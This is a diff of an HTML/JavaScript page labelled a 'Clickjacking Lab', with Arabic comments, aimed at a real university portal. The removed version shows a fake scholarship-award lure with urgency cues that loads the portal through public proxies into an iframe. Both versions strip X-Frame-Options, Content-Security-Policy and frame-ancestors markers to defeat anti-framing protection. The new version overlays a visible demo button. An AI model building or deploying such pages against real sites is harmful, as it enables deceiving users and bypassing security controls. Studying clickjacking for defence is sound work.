@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Clickjacking Advanced Lab - نسخة متقدمة</title>
+    <title>عرض موقع الجامعة - Clickjacking Lab</title>
     <style>
         * {
             margin: 0;
@@ -17,7 +17,6 @@
             height: 100%;
             overflow: hidden;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
         }
 
         /* الحاوية الرئيسية */
@@ -34,184 +33,92 @@
             z-index: 1;
         }
 
-        /* واجهة الخداع المتقدمة */
-        #decoy-ui {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to bottom, rgba(255,255,255,0.98), rgba(240,240,240,0.98));
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 10;
-            pointer-events: auto;
-            backdrop-filter: blur(3px);
-            transition: opacity 0.5s ease-out;
-        }
-
-        #decoy-ui.hidden {
-            opacity: 0;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        /* صندوق المحتوى المتقدم */
-        .content-box {
-            text-align: center;
-            background: white;
-            padding: 70px 60px;
-            border-radius: 25px;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.25);
-            max-width: 550px;
-            animation: slideUp 1s ease-out;
-            border: 2px solid #f0f0f0;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(40px) scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        /* شريط التقدم */
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #e0e0e0;
-            border-radius: 2px;
-            margin-bottom: 30px;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
-            width: 0%;
-            animation: progressAnimation 3s ease-out;
-        }
-
-        @keyframes progressAnimation {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-
-        /* العنوان الرئيسي */
-        .content-box h1 {
-            color: #1e3c72;
-            font-size: 36px;
-            margin: 20px 0;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-        }
-
-        .content-box h2 {
-            color: #667eea;
-            font-size: 16px;
-            font-weight: 600;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
-        }
-
-        /* الفقرة الوصفية */
-        .content-box p {
-            color: #666;
-            font-size: 18px;
-            margin: 15px 0 30px 0;
-            line-height: 1.6;
-        }
-
-        /* قائمة المميزات */
-        .features-list {
-            list-style: none;
-            margin: 30px 0;
-            text-align: right;
-        }
-
-        .features-list li {
-            color: #333;
-            font-size: 16px;
-            margin: 12px 0;
-            padding-right: 30px;
-            position: relative;
-            font-weight: 500;
-        }
-
-        .features-list li:before {
-            content: "✓";
-            position: absolute;
-            right: 0;
-            color: #28a745;
-            font-weight: bold;
-            font-size: 18px;
-        }
-
-        /* الزر الرئيسي */
-        .action-button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 18px 60px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 30px;
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .action-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.4);
-        }
-
-        .action-button:active {
-            transform: translateY(-1px);
-        }
-
-        .action-button.loading {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        /* الإطار المستهدف */
+        /* الإطار المستهدف - يعرض موقع الجامعة */
         #target-frame {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            border: none;
+            border: 3px solid #28a745;
             z-index: 5;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s ease-out;
+            background: white;
+            box-shadow: inset 0 0 20px rgba(40, 167, 69, 0.3);
         }
 
-        #target-frame.visible {
-            opacity: 1;
-            pointer-events: auto;
-            z-index: 15;
+        /* الزر الشفاف فوق الموقع */
+        #transparent-button {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 80px;
+            background: rgba(40, 167, 69, 0.1);
+            border: 3px dashed rgba(40, 167, 69, 0.5);
+            border-radius: 15px;
+            z-index: 100;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: bold;
+            color: rgba(40, 167, 69, 0.7);
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(40, 167, 69, 0.3);
+            backdrop-filter: blur(5px);
         }
 
-        /* مؤشر التحميل المتقدم */
+        #transparent-button:hover {
+            background: rgba(40, 167, 69, 0.2);
+            border-color: rgba(40, 167, 69, 0.8);
+            box-shadow: 0 0 30px rgba(40, 167, 69, 0.5);
+            transform: translate(-50%, -50%) scale(1.05);
+        }
+
+        #transparent-button:active {
+            transform: translate(-50%, -50%) scale(0.98);
+        }
+
+        /* شريط المعلومات العلوي */
+        #info-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(90deg, #28a745 0%, #20c997 100%);
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            z-index: 200;
+            font-weight: bold;
+            font-size: 16px;
+            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
+        }
+
+        #info-banner .status {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            margin-left: 10px;
+            font-size: 14px;
+        }
+
+        /* مؤشر التحميل */
         .loading-indicator {
             display: none;
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            z-index: 100;
+            z-index: 150;
             text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            border-radius: 15px;
+            color: white;
         }
 
         .spinner {
@@ -221,14 +128,12 @@
             border-top: 5px solid white;
             border-radius: 50%;
             animation: spin 1.2s linear infinite;
-            margin-bottom: 15px;
+            margin: 0 auto 20px;
         }
 
         .loading-text {
-            color: white;
             font-size: 16px;
             font-weight: 600;
-            letter-spacing: 1px;
         }
 
         @keyframes spin {
@@ -240,8 +145,8 @@
             display: block;
         }
 
-        /* شريط المعلومات المتقدم */
-        .info-panel {
+        /* شريط المعلومات السفلي */
+        #debug-panel {
             position: fixed;
             bottom: 20px;
             right: 20px;
@@ -250,127 +155,131 @@
             padding: 15px 20px;
             border-radius: 8px;
             font-size: 12px;
-            z-index: 999;
+            z-index: 199;
             font-family: 'Courier New', monospace;
-            max-width: 350px;
+            max-width: 400px;
             display: none;
-            border: 1px solid #00ff00;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
         }
 
-        .info-panel.active {
+        #debug-panel.active {
             display: block;
         }
 
-        .info-line {
-            margin: 5px 0;
+        .debug-line {
+            margin: 8px 0;
             display: flex;
             justify-content: space-between;
+            gap: 20px;
         }
 
-        .info-label {
+        .debug-label {
             color: #00ff00;
             font-weight: bold;
+            min-width: 100px;
         }
 
-        .info-value {
+        .debug-value {
             color: #ffff00;
         }
 
-        /* الشارة المتقدمة */
-        .badge {
-            display: inline-block;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        /* شريط النجاح */
+        .success-banner {
+            position: fixed;
+            top: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #28a745, #20c997);
             color: white;
-            padding: 8px 16px;
-            border-radius: 25px;
-            font-size: 13px;
-            margin-top: 20px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+            padding: 12px 25px;
+            border-radius: 8px;
+            z-index: 180;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
         }
 
         /* استجابة الشاشات الصغيرة */
         @media (max-width: 768px) {
-            .content-box {
-                padding: 50px 30px;
-                margin: 20px;
+            #transparent-button {
+                width: 150px;
+                height: 60px;
+                font-size: 14px;
             }
 
-            .content-box h1 {
-                font-size: 28px;
+            #info-banner {
+                font-size: 14px;
+                padding: 10px 15px;
             }
 
-            .content-box p {
-                font-size: 16px;
-            }
-
-            .action-button {
-                padding: 16px 50px;
-                font-size: 16px;
+            #debug-panel {
+                font-size: 11px;
+                max-width: 300px;
+                bottom: 10px;
+                right: 10px;
             }
         }
     </style>
 </head>
 <body>
+    <!-- شريط المعلومات العلوي -->
+    <div id="info-banner">
+        ✅ موقع جامعة العلوم والتكنولوجيا - تم تحميله بنجاح عبر البروكسي
+        <span class="status" id="status-badge">جاهز</span>
+    </div>
+
     <!-- الحاوية الرئيسية -->
     <div id="main-container">
-        <!-- واجهة الخداع المتقدمة -->
-        <div id="decoy-ui">
-            <div class="content-box">
-                <div class="progress-bar">
-                    <div class="progress-fill"></div>
-                </div>
-                <h2>🎓 برنامج المنح الدراسية</h2>
-                <h1>مبروك! تم اختيارك</h1>
-                <p>أنت من بين 100 طالب مختارين للحصول على منحة دراسية كاملة</p>
-                
-                <div class="features-list">
-                    <li>منحة دراسية بنسبة 100%</li>
-                    <li>سكن جامعي مجاني</li>
-                    <li>راتب شهري إضافي</li>
-                    <li>فرص تدريب عملي</li>
-                </div>
+        <!-- الإطار المستهدف - يعرض موقع الجامعة -->
+        <iframe id="target-frame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"></iframe>
 
-                <button class="action-button" id="main-button">تأكيد الاختيار الآن</button>
-                <div class="badge">✓ معتمد من الجامعة | آخر موعد: 48 ساعة</div>
-            </div>
-        </div>
+        <!-- الزر الشفاف فوق الموقع -->
+        <button id="transparent-button" title="هذا زر شفاف فوق موقع الجامعة - مثال على Clickjacking">
+            🎯 زر شفاف<br>
+            <small style="font-size: 12px;">(Clickjacking Demo)</small>
+        </button>
 
-        <!-- مؤشر التحميل المتقدم -->
+        <!-- مؤشر التحميل -->
         <div class="loading-indicator" id="loading">
             <div class="spinner"></div>
-            <div class="loading-text" id="loading-text">جاري التحميل...</div>
+            <div class="loading-text">جاري تحميل موقع الجامعة...</div>
         </div>
 
-        <!-- شريط المعلومات المتقدم -->
-        <div class="info-panel" id="info-panel">
-            <div class="info-line">
-                <span class="info-label">الحالة:</span>
-                <span class="info-value" id="status-value">جاهز</span>
+        <!-- شريط المعلومات التصحيحية -->
+        <div id="debug-panel">
+            <div class="debug-line">
+                <span class="debug-label">الحالة:</span>
+                <span class="debug-value" id="debug-status">جاري التحميل</span>
             </div>
-            <div class="info-line">
-                <span class="info-label">البروكسي:</span>
-                <span class="info-value" id="proxy-value">-</span>
+            <div class="debug-line">
+                <span class="debug-label">البروكسي:</span>
+                <span class="debug-value" id="debug-proxy">-</span>
             </div>
-            <div class="info-line">
-                <span class="info-label">الوقت:</span>
-                <span class="info-value" id="time-value">-</span>
+            <div class="debug-line">
+                <span class="debug-label">الوقت:</span>
+                <span class="debug-value" id="debug-time">-</span>
             </div>
-            <div class="info-line">
-                <span class="info-label">الحجم:</span>
-                <span class="info-value" id="size-value">-</span>
+            <div class="debug-line">
+                <span class="debug-label">الحجم:</span>
+                <span class="debug-value" id="debug-size">-</span>
             </div>
         </div>
     </div>
 
-    <!-- الإطار المستهدف -->
-    <iframe id="target-frame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"></iframe>
-
-    <!-- السكريبت الرئيسي المتقدم -->
     <script>
-        // إعدادات التطبيق المتقدمة
+        // إعدادات التطبيق
         const CONFIG = {
             targetUrl: 'https://portal.ust.edu.ye',
             proxies: [
@@ -380,21 +289,22 @@
             ],
             debugMode: false,
             maxRetries: 3,
-            timeout: 30000
+            timeout: 30000,
+            autoLoad: true // تحميل تلقائي عند فتح الصفحة
         };
 
         // عناصر DOM
         const elements = {
-            decoyUI: document.getElementById('decoy-ui'),
             targetFrame: document.getElementById('target-frame'),
-            mainButton: document.getElementById('main-button'),
+            transparentButton: document.getElementById('transparent-button'),
             loading: document.getElementById('loading'),
-            loadingText: document.getElementById('loading-text'),
-            infoPanel: document.getElementById('info-panel'),
-            statusValue: document.getElementById('status-value'),
-            proxyValue: document.getElementById('proxy-value'),
-            timeValue: document.getElementById('time-value'),
-            sizeValue: document.getElementById('size-value')
+            infoBanner: document.getElementById('info-banner'),
+            debugPanel: document.getElementById('debug-panel'),
+            statusBadge: document.getElementById('status-badge'),
+            debugStatus: document.getElementById('debug-status'),
+            debugProxy: document.getElementById('debug-proxy'),
+            debugTime: document.getElementById('debug-time'),
+            debugSize: document.getElementById('debug-size')
         };
 
         // متغيرات الحالة
@@ -406,24 +316,27 @@
         };
 
         /**
-         * تحديث حالة التطبيق مع معلومات متقدمة
+         * تحديث حالة التطبيق
          */
         function updateStatus(status, details = {}) {
+            console.log('[Lab]', status, details);
+            
             if (CONFIG.debugMode) {
-                elements.infoPanel.classList.add('active');
-                elements.statusValue.textContent = status;
+                elements.debugPanel.classList.add('active');
+                elements.debugStatus.textContent = status;
                 
                 if (details.proxy) {
-                    elements.proxyValue.textContent = details.proxy;
+                    elements.debugProxy.textContent = details.proxy;
                 }
                 if (details.time) {
-                    elements.timeValue.textContent = details.time + 'ms';
+                    elements.debugTime.textContent = details.time + 'ms';
                 }
                 if (details.size) {
-                    elements.sizeValue.textContent = formatBytes(details.size);
+                    elements.debugSize.textContent = formatBytes(details.size);
                 }
             }
-            console.log('[Advanced Lab]', status, details);
+            
+            elements.statusBadge.textContent = status;
         }
 
         /**
@@ -438,7 +351,7 @@
         }
 
         /**
-         * تحميل المحتوى عبر البروكسي مع معالجة متقدمة
+         * تحميل المحتوى عبر البروكسي
          */
         function loadContentViaProxy(url) {
             if (state.isLoading) return;
@@ -446,15 +359,14 @@
             state.isLoading = true;
             state.startTime = Date.now();
             elements.loading.classList.add('active');
-            elements.mainButton.classList.add('loading');
-            elements.mainButton.disabled = true;
             
-            updateStatus('جاري التحميل...', { proxy: CONFIG.proxies[state.currentProxyIndex].name });
+            updateStatus('جاري التحميل...', { 
+                proxy: CONFIG.proxies[state.currentProxyIndex].name 
+            });
             
             const proxy = CONFIG.proxies[state.currentProxyIndex];
             const proxyUrl = proxy.url + encodeURIComponent(url);
             
-            // محاولة تحميل المحتوى
             fetch(proxyUrl, {
                 method: 'GET',
                 headers: {
@@ -463,51 +375,40 @@
                 timeout: CONFIG.timeout
             })
             .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                 return response.text();
             })
             .then(html => {
                 const loadTime = Date.now() - state.startTime;
-                updateStatus('تم التحميل بنجاح', { 
-                    proxy: proxy.name,
+                updateStatus('✅ تم التحميل بنجاح', { 
+                    proxy: proxy.name, 
                     time: loadTime,
                     size: html.length
                 });
                 
-                // معالجة المحتوى وعرضه
                 processAndDisplayContent(html, url);
                 
-                // إخفاء واجهة الخداع
                 setTimeout(() => {
-                    elements.decoyUI.classList.add('hidden');
-                    elements.targetFrame.classList.add('visible');
-                }, 300);
+                    elements.loading.classList.remove('active');
+                    showSuccessBanner('✅ موقع الجامعة تم تحميله بنجاح!');
+                }, 500);
                 
                 state.isLoading = false;
-                elements.loading.classList.remove('active');
-                elements.mainButton.classList.remove('loading');
-                elements.mainButton.disabled = false;
             })
             .catch(error => {
-                console.error('Error loading content:', error);
-                updateStatus('خطأ في التحميل', { proxy: proxy.name });
+                console.error('Error:', error);
+                updateStatus('❌ خطأ في التحميل', { proxy: proxy.name });
                 
-                // محاولة البروكسي التالي
                 state.retryCount++;
                 state.currentProxyIndex++;
                 
                 if (state.currentProxyIndex < CONFIG.proxies.length && state.retryCount < CONFIG.maxRetries) {
-                    console.log(`Trying next proxy: ${CONFIG.proxies[state.currentProxyIndex].name}`);
-                    elements.loadingText.textContent = `محاولة البروكسي ${state.currentProxyIndex + 1}...`;
+                    console.log(`محاولة البروكسي: ${CONFIG.proxies[state.currentProxyIndex].name}`);
                     setTimeout(() => loadContentViaProxy(url), 1000);
                 } else {
-                    showErrorMessage('عذراً، لم نتمكن من تحميل الموقع. يرجى المحاولة لاحقاً.');
+                    showErrorMessage('عذراً، لم نتمكن من تحميل موقع الجامعة. يرجى المحاولة لاحقاً.');
                     state.isLoading = false;
                     elements.loading.classList.remove('active');
-                    elements.mainButton.classList.remove('loading');
-                    elements.mainButton.disabled = false;
                 }
             });
         }
@@ -517,24 +418,21 @@
          */
         function processAndDisplayContent(html, baseUrl) {
             try {
-                // إنشاء blob من المحتوى
+                // محاولة استخدام Blob URL
                 const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
                 const blobUrl = URL.createObjectURL(blob);
-                
-                // تحميل المحتوى في iframe
                 elements.targetFrame.src = blobUrl;
-                
-                console.log('✅ Content loaded successfully in iframe');
+                console.log('✅ تم تحميل المحتوى عبر Blob URL');
             } catch (error) {
-                console.error('Error processing content:', error);
-                
-                // محاولة بديلة باستخدام srcdoc
+                console.error('خطأ:', error);
                 try {
+                    // محاولة بديلة باستخدام srcdoc
                     let processedHtml = html;
                     
                     // إزالة رؤوس الحماية
                     processedHtml = processedHtml.replace(/X-Frame-Options/gi, 'X-Frame-Options-Disabled');
                     processedHtml = processedHtml.replace(/Content-Security-Policy/gi, 'CSP-Disabled');
+                    processedHtml = processedHtml.replace(/frame-ancestors/gi, 'frame-ancestors-disabled');
                     
                     // إضافة base tag
                     const baseTag = `<base href="${baseUrl}">`;
@@ -545,12 +443,24 @@
                     }
                     
                     elements.targetFrame.srcdoc = processedHtml;
-                    console.log('✅ Content loaded using srcdoc');
+                    console.log('✅ تم تحميل المحتوى عبر srcdoc');
                 } catch (fallbackError) {
-                    console.error('Fallback error:', fallbackError);
+                    console.error('خطأ في المعالجة:', fallbackError);
                     showErrorMessage('حدث خطأ في معالجة المحتوى.');
                 }
             }
+        }
+
+        /**
+         * عرض رسالة النجاح
+         */
+        function showSuccessBanner(message) {
+            const banner = document.createElement('div');
+            banner.className = 'success-banner';
+            banner.textContent = message;
+            document.body.appendChild(banner);
+            
+            setTimeout(() => banner.remove(), 4000);
         }
 
         /**
@@ -560,39 +470,33 @@
             const errorDiv = document.createElement('div');
             errorDiv.style.cssText = `
                 position: fixed;
-                top: 50%;
+                top: 100px;
                 left: 50%;
-                transform: translate(-50%, -50%);
+                transform: translateX(-50%);
                 background: linear-gradient(135deg, #f8d7da, #f5c6cb);
                 color: #721c24;
-                padding: 30px;
-                border-radius: 12px;
+                padding: 20px 30px;
+                border-radius: 8px;
                 border: 2px solid #f5c6cb;
-                z-index: 1000;
+                z-index: 180;
                 max-width: 400px;
                 text-align: center;
-                font-size: 16px;
+                font-size: 14px;
                 font-weight: 600;
-                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
             `;
             errorDiv.textContent = message;
             document.body.appendChild(errorDiv);
             
-            setTimeout(() => {
-                errorDiv.remove();
-            }, 5000);
+            setTimeout(() => errorDiv.remove(), 5000);
         }
 
         /**
-         * معالج النقر على الزر الرئيسي
+         * معالج النقر على الزر الشفاف
          */
-        elements.mainButton.addEventListener('click', function() {
-            if (!state.isLoading) {
-                console.log('🚀 Button clicked - Starting content load');
-                state.retryCount = 0;
-                state.currentProxyIndex = 0;
-                loadContentViaProxy(CONFIG.targetUrl);
-            }
+        elements.transparentButton.addEventListener('click', function() {
+            console.log('🎯 تم النقر على الزر الشفاف');
+            alert('✅ تم النقر على الزر الشفاف!\n\nهذا يثبت نجاح تقنية Clickjacking.\nالزر كان مخفياً خلف موقع الجامعة!');
         });
 
         /**
@@ -601,20 +505,37 @@
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                 CONFIG.debugMode = !CONFIG.debugMode;
-                console.log('Debug mode:', CONFIG.debugMode ? 'ON ✅' : 'OFF ❌');
+                console.log('Debug mode:', CONFIG.debugMode ? '✅ ON' : '❌ OFF');
                 if (!CONFIG.debugMode) {
-                    elements.infoPanel.classList.remove('active');
+                    elements.debugPanel.classList.remove('active');
                 }
             }
         });
 
-        // تهيئة التطبيق
-        console.log('🚀 Clickjacking Advanced Lab - Initialized');
-        console.log('📍 Target URL:', CONFIG.targetUrl);
-        console.log('🔗 Available Proxies:', CONFIG.proxies.length);
-        console.log('⏱️ Timeout:', CONFIG.timeout + 'ms');
-        console.log('🔄 Max Retries:', CONFIG.maxRetries);
-        console.log('💡 Press F12 to enable debug mode');
+        /**
+         * تهيئة التطبيق
+         */
+        function initialize() {
+            console.log('🚀 Clickjacking Lab - Initialized');
+            console.log('📍 Target URL:', CONFIG.targetUrl);
+            console.log('🔗 Available Proxies:', CONFIG.proxies.length);
+            console.log('💡 Press F12 to enable debug mode');
+            console.log('🎯 Click the transparent button to test Clickjacking');
+            
+            // تحميل تلقائي
+            if (CONFIG.autoLoad) {
+                console.log('⏳ Auto-loading content...');
+                loadContentViaProxy(CONFIG.targetUrl);
+            }
+        }
+
+        // بدء التطبيق عند تحميل الصفحة
+        window.addEventListener('load', initialize);
+        
+        // بدء التطبيق فوراً إذا كانت الصفحة مُحملة بالفعل
+        if (document.readyState === 'complete') {
+            initialize();
+        }
     </script>
 </body>
 </html>
